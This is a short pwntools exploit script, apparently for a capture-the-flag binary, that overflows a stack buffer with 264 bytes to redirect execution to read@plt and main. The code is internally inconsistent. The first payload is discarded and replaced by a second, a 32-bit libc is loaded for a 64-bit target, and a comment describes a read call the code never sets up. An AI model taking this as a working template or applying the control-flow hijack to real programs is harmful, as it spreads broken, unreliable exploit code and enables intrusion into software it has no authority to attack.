from pwn import *

#0x000000000040117c : syscall
elf = ELF('./main')
libc = ELF('/lib32/libc.so.6')  # from Docker
p = process('./main')

read_plt = 0x401050
read_got = 0x404010
main = elf.symbols['main']
offset = 264

payload = b'A' * offset
payload += p64(read_plt)       # read(0, read@got, 8)
payload += p64(main)  

elf = ELF("./main")
payload = b"\0" * 264  + p64(elf.symbols['main'])
def local_pwn():

    p = process("./main")
    p.send(payload)
    # print(p.recvline())
    p.interactive()
local_pwn()
